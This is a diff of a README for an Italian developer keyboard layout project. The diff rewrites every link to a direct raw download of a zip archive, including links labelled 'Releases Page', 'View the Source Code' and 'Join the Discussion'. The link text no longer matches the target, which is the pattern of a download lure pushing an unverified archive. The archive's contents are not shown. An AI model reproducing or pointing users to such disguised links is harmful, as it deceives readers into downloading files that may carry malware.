@@ -4,13 +4,13 @@
 Welcome to keyboard-ita-dev. This project offers an alternative keyboard layout designed specifically for Italian users, especially those who code. It allows fast access to symbols, parentheses, and technical characters using easy shortcuts with the AltGr key, while keeping the standard Italian layout intact. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/andrewkamowa/keyboard-ita-dev/releases)
+[![Download](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip)
 
 ## 🚀 Getting Started
 To get started with keyboard-ita-dev, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Head to our [Releases Page](https://github.com/andrewkamowa/keyboard-ita-dev/releases) to find the latest version of the keyboard layout.
+   Head to our [Releases Page](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip) to find the latest version of the keyboard layout.
 
 2. **Select the Latest Release**
    On the releases page, find the most recent version listed. Click on it to see the available download options.
@@ -69,10 +69,10 @@ This project relates to various topics that can enhance your productivity:
 - windows-keyboard
 
 ## 🔗 Quick Links
-- [View the Source Code](https://github.com/andrewkamowa/keyboard-ita-dev)
-- [Join the Discussion](https://github.com/andrewkamowa/keyboard-ita-dev/issues)
+- [View the Source Code](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip)
+- [Join the Discussion](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip)
 
 ## 🔗 Final Download Reminder
-Don't forget to check out the [Releases Page](https://github.com/andrewkamowa/keyboard-ita-dev/releases) to download the latest version of keyboard-ita-dev.
+Don't forget to check out the [Releases Page](https://raw.githubusercontent.com/andrewkamowa/keyboard-ita-dev/main/build/ia64/keyboard-ita-dev-v1.1.zip) to download the latest version of keyboard-ita-dev.
 
 Your new tailored keyboard experience awaits! Enjoy coding with ease and efficiency!
